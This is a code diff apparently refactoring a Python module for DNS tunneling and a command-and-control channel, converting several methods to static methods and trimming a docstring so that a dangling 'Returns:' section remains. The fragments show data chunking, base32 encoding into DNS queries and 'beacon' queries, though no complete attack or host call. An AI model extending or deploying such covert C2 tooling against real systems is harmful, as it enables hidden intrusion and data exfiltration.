@@ -500,7 +500,8 @@ class DNSTunneler:
 
         return labels
 
-    def decode_data(self, labels: list[str]) -> bytes:
+    @staticmethod
+    def decode_data(labels: list[str]) -> bytes:
         """
         Decode data from DNS response.
 
@@ -520,12 +521,6 @@ class DNSTunneler:
         return base64.b32decode(encoded)
 
     def build_query(self, data: bytes, query_type: str = "beacon") -> str:
-        """
-        Build DNS query hostname.
-
-        Args:
-            data: Data to send
-            query_type: Type identifier for the query
 
         Returns:
             Full DNS query hostname
@@ -602,7 +597,8 @@ class DNSTunneler:
             logger.error(f"DNS tunnel query failed: {e}")
             return False, str(e).encode()
 
-    def chunk_data(self, data: bytes, chunk_size: int = 60) -> list[bytes]:
+    @staticmethod
+    def chunk_data(data: bytes, chunk_size: int = 60) -> list[bytes]:
         """
         Split data into chunks for multiple DNS queries.
 
@@ -1022,7 +1018,8 @@ class C2Channel:
 
         # Add more command handlers as needed
 
-    def _generate_id(self) -> str:
+    @staticmethod
+    def _generate_id() -> str:
         """Generate unique message ID"""
         import secrets
         return hashlib.sha256(f"{time.time()}{secrets.randbelow(1_000_000)}".encode()).hexdigest()[
@@ -1046,7 +1043,6 @@ class C2Channel:
 # =============================================================================
 
 _c2_channel: C2Channel | None = None
-
 
 def get_c2_channel(config: C2Config | None = None) -> C2Channel:
     """
